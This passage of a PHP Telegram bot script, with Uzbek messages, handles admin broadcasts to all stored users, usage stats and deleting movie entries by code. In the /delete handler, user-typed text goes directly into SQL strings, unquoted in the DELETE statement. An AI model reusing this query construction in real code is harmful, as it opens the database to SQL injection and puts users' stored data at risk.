exit();
}
}
}
}

//<-------- @modderboy ------->//

if($text == "/send" and $cid == $admin){
bot('SendMessage',[
'chat_id'=>$cid,
    'text'=>"*Xabar matnini kiriting:*",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$mid,
]);
mysqli_query($connect, "UPDATE user_id SET step = 'send' WHERE user_id = $cid");
exit();
}

if($step == "send"){
if($cid == $admin){
mysqli_query($connect, "UPDATE user_id SET step = '0' WHERE user_id = $cid");
$res = mysqli_query($connect,"SELECT * FROM `user_id`");
bot('sendMessage',[
  'chat_id'=>$chat_id,
  'text'=>"✅ <b>Xabar yuborish boshlandi!</b>",
'parse_mode'=>'html',
  ]);
$x=0;
$y=0;
while($a = mysqli_fetch_assoc($res)){
$id = $a['user_id'];
	$key=$message->reply_markup;
	$keyboard=json_encode($key);
	$ok=bot('copyMessage',[
'from_chat_id'=>$chat_id,
'chat_id'=>$id,
'message_id'=>$mid,
])->ok;
if($ok==true){
}else{
$okk=bot('copyMessage',[
'from_chat_id'=>$chat_id,
'chat_id'=>$id,
'message_id'=>$mid,
])->ok;
}
if($okk==true or $ok==true){
$x=$x+1;
bot('editMessageText',[
  'chat_id'=>$chat_id,
'message_id'=>$mid,
'text'=>"✅ <b>Yuborildi:</b> $x

❌ <b>Yuborilmadi:</b> $y",
'parse_mode'=>'html',
]);
}elseif($okk==false){
mysqli_query($connect, "DELETE FROM `user_id` WHERE user_id = '$id'");
$y=$y+1;
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$mid + 1,
'text'=>"✅ <b>Yuborildi:</b> $x

❌ <b>Yuborilmadi:</b> $y",
'parse_mode'=>'html',
]);
}
}
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$mid + 1,
'text'=>"✅ <b>Yuborildi:</b> $x

❌ <b>Yuborilmadi:</b> $y",
'parse_mode'=>'html',
]);
}
exit();
}

if($text == "/stat"){
$res = mysqli_query($connect, "SELECT * FROM `user_id`");
$us = mysqli_num_rows($res);
$res = mysqli_query($connect, "SELECT * FROM `data`");
$kin = mysqli_num_rows($res);
$start_time = round(microtime(true) * 1000);
bot('SendMessage',[
'chat_id'=>$cid,
'text'=>"",
'parse_mode'=>'html',
]);
$end_time = round(microtime(true) * 1000);
$ping = $end_time - $start_time;
bot('SendMessage',[
'chat_id'=>$cid,
'text'=>"<b>O'rtacha yuklanish:</b> <code>$ping</code>

• <b>Foydalanuvchilar:</b> $us ta
• <b>Yuklangan kinolar:</b> $kin ta",
'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
]);
exit();
}

if(mb_stripos($text, "/delete") !== false){
if($cid == $admin){
$code = explode(" ", $text)[1];
$res = mysqli_query($connect,"SELECT * FROM data WHERE code = '$code'");
$row = mysqli_fetch_assoc($res);
if(!$row){
	bot('SendMessage',[
	'chat_id'=>$cid,
	'text'=>"$code <b>mavjud emas!</b>

Qayta urinib ko'ring:",
'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
]);
exit();
}else{
mysqli_query($connect,"DELETE FROM data WHERE code = $code"); 
bot('sendMessage',[
'chat_id'=>$cid,
'text'=>"$code <b>raqamli kino olib tashlandi!</b>",
'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
]);
exit();
}
}
}

?>